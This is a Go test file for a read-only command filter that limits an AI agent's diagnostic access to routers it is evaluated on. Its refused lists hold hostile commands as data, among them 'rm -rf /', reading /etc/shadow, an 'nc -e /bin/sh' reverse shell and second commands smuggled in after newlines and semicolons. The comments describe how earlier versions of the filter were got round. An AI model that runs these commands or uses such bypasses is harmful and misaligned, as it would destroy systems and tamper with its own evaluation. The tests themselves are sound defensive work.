package agent

import "testing"

// The credential an evaluated agent is handed has to be weaker than the one the
// operator holds, or "the agent may not read the answer" is a convention rather
// than a control.
func TestADiagnosticTokenIsScopedToOneLab(t *testing.T) {
	const secret = "s3cret"
	tok := DiagnosticToken(secret, "cos461-routing")
	if tok == secret {
		t.Fatal("the diagnostic credential is the cluster token")
	}
	lab, ok := diagnosticScope(secret, tok)
	if !ok || lab != "cos461-routing" {
		t.Fatalf("a freshly minted token did not verify: %q %v", lab, ok)
	}
	if _, ok := diagnosticScope("other", tok); ok {
		t.Error("a token verified under a different cluster secret")
	}
	// The scope is signed, so it cannot be edited into a wider one.
	other := DiagnosticToken(secret, "advnet")
	forged := tok[:len(diagPrefix)] + other[len(diagPrefix):len(other)-64] + tok[len(tok)-64:]
	if _, ok := diagnosticScope(secret, forged); ok {
		t.Error("a token whose lab was swapped still verified")
	}
	if _, ok := diagnosticScope(secret, secret); ok {
		t.Error("the cluster token verified as a diagnostic one")
	}
}

func TestADiagnosticSessionMayOnlyObserve(t *testing.T) {
	allowed := [][]string{
		{"vtysh", "-c", "show ip bgp summary"},
		{"vtysh", "-c", "show running-config"},
		{"ip", "-br", "addr", "show"},
		{"ip", "route"},
		{"ping", "-c", "3", "1.2.3.4"},
		{"traceroute", "10.0.0.1"},
		{"cat", "/etc/frr/frr.conf"},
		{"ss", "-tnp"},
		{"tcpdump", "-c", "10", "-i", "eth0"},
	}
	for _, c := range allowed {
		if err := ReadOnlyCommand(c); err != nil {
			t.Errorf("%v is how you diagnose a router, and it was refused: %v", c, err)
		}
	}
	refused := [][]string{
		{"vtysh", "-c", "configure terminal"},
		{"vtysh", "-c", "conf t"},
		{"vtysh", "-c", "clear ip bgp *"},
		{"vtysh", "-c", "show run > /tmp/x"},
		{"ip", "link", "set", "eth0", "down"},
		{"ip", "addr", "add", "10.0.0.1/24", "dev", "eth0"},
		{"ip", "route", "del", "default"},
		{"bridge", "link", "set", "dev", "eth0", "state", "0"},
		{"sh", "-c", "cat /etc/shadow"},
		{"bash", "-lc", "true"},
		{"tc", "qdisc", "add", "dev", "eth0", "root", "netem", "loss", "50%"},
		{"iptables", "-A", "INPUT", "-j", "DROP"},
		{"kill", "1"},
		{"rm", "-rf", "/"},
		{"ping", "1.2.3.4; rm -rf /"},
		{"sysctl", "-w", "net.ipv4.ip_forward=0"},
	}
	for _, c := range refused {
		if err := ReadOnlyCommand(c); err == nil {
			t.Errorf("%v changes the device an agent is being scored on, and it was allowed", c)
		}
	}
}

// A newline is a command separator, and vtysh is not an exception.
//
// The metacharacter check exempted vtysh, because a show command may legally
// contain a pipe, and only the first word of a -c body was validated. Both
// together let a diagnostic session send
// "show version\nconfigure terminal\ninterface lo\ndescription ..." as one
// argument whose first word is "show", and change the router -- while a plain
// "configure terminal" was refused. An agent that can edit the device it is
// being scored on is not being scored on anything.
func TestADiagnosticSessionCannotHideACommandBehindANewline(t *testing.T) {
	refused := [][]string{
		{"vtysh", "-c", "show version\nconfigure terminal\ninterface lo\ndescription x\nend"},
		{"vtysh", "-c", "show version\rconfigure terminal"},
		{"vtysh", "-c", "show version; configure terminal"},
		{"vtysh", "-c", "show ip bgp\nclear ip bgp *"},
		{"ip", "-br\naddr", "show"},
		{"ping", "1.2.3.4\nreboot"},
		{"cat", "/etc/frr/frr.conf\nrm -rf /"},
	}
	for _, c := range refused {
		if err := ReadOnlyCommand(c); err == nil {
			t.Errorf("%q hides a second command behind a separator and was allowed", c)
		}
	}
	// And the legitimate uses still work, including vtysh's own output filter.
	allowed := [][]string{
		{"vtysh", "-c", "show ip bgp summary"},
		{"vtysh", "-c", "show running-config | include neighbor"},
		{"vtysh", "-c", "show ip route json"},
	}
	for _, c := range allowed {
		if err := ReadOnlyCommand(c); err != nil {
			t.Errorf("%q is how you read a router, and it was refused: %v", c, err)
		}
	}
}

// A write verb is a write verb wherever it appears.
//
// The parser took the first argument that did not begin with a dash as the
// object and the next as the verb, so `ip -family inet link set dev lo down` --
// where "inet" is the argument to -family -- made "inet" the object, "link" the
// verb, and "set" invisible. A diagnostic session took an interface down on a
// host it was being scored on.
func TestADiagnosticSessionCannotHideAWriteBehindAnOption(t *testing.T) {
	refused := [][]string{
		{"ip", "-family", "inet", "link", "set", "dev", "lo", "down"},
		{"ip", "-f", "inet", "addr", "add", "10.0.0.1/24", "dev", "eth0"},
		{"ip", "-j", "-family", "inet6", "route", "del", "default"},
		{"ip", "-batch", "/tmp/commands"},
		{"ip", "-netns", "other", "link", "show"},
		{"ip", "-force", "-batch", "/tmp/x"},
		{"bridge", "-j", "link", "set", "dev", "eth0", "state", "0"},
		{"sysctl", "-w", "net.ipv4.ip_forward=0"},
		{"sysctl", "--write", "net.ipv4.ip_forward=0"},
		{"tcpdump", "-i", "eth0", "-w", "/tmp/cap.pcap"},
		{"tcpdump", "-i", "eth0", "-G", "1", "-z", "/bin/sh"},
	}
	for _, c := range refused {
		if err := ReadOnlyCommand(c); err == nil {
			t.Errorf("%v changes the device or runs a command on it, and was allowed", c)
		}
	}
	allowed := [][]string{
		{"ip", "-family", "inet", "link", "show"},
		{"ip", "-j", "-br", "addr", "show"},
		{"ip", "-6", "route", "show"},
		{"ip", "route", "get", "1.2.3.4"},
		{"bridge", "-j", "link", "show"},
		{"sysctl", "net.ipv4.ip_forward"},
		{"tcpdump", "-n", "-c", "10", "-i", "eth0"},
	}
	for _, c := range allowed {
		if err := ReadOnlyCommand(c); err != nil {
			t.Errorf("%v only reads, and was refused: %v", c, err)
		}
	}
}

// The long option is the same option.
//
// The vtysh rule matched the literal "-c" and nothing else, so
// `vtysh --command 'configure terminal' --command 'interface lo' ...` went
// through untouched and a diagnostic session edited a router. And `ethtool -K`
// turns offloads off on a device the session is only meant to watch, which no
// scan for write verbs would ever have found: the fix for a denylist that keeps
// being walked past is not a longer denylist.
func TestADiagnosticSessionHasAGrammarRatherThanADenylist(t *testing.T) {
	refused := [][]string{
		{"vtysh", "--command", "configure terminal"},
		{"vtysh", "--command=configure terminal"},
		{"vtysh", "-c=configure terminal"},
		{"vtysh", "-d", "bgpd", "-c", "show ip bgp"},
		{"vtysh", "-b"},
		{"vtysh", "-f", "/tmp/config"},
		{"ethtool", "-K", "host", "rx", "off"},
		{"ethtool", "-k", "host"},
		{"nc", "-e", "/bin/sh", "10.0.0.1", "9"},
		{"curl", "-o", "/etc/frr/frr.conf", "http://x/"},
		{"wget", "-O", "/tmp/x", "http://x/"},
		{"birdc", "configure"},
		{"ss", "-K", "dst", "10.0.0.1"},
		{"arp", "-d", "10.0.0.1"},
		{"arp", "-s", "10.0.0.1", "00:11:22:33:44:55"},
		{"hostname", "not-this-router"},
		{"sysctl", "net.ipv4.ip_forward=0"},
		{"sysctl", "-p"},
	}
	for _, c := range refused {
		if err := ReadOnlyCommand(c); err == nil {
			t.Errorf("%v can change the device or is not needed to observe one, and was "+
				"allowed", c)
		}
	}
	allowed := [][]string{
		{"vtysh", "--command", "show ip bgp summary"},
		{"vtysh", "--command=show running-config"},
		{"vtysh", "-c", "show ip route json"},
		{"ss", "-tnp"},
		{"arp", "-n"},
		{"hostname"},
		{"hostname", "-f"},
		{"sysctl", "net.ipv4.ip_forward"},
		{"iptables-save"},
	}
	for _, c := range allowed {
		if err := ReadOnlyCommand(c); err != nil {
			t.Errorf("%v only observes, and was refused: %v", c, err)
		}
	}
}
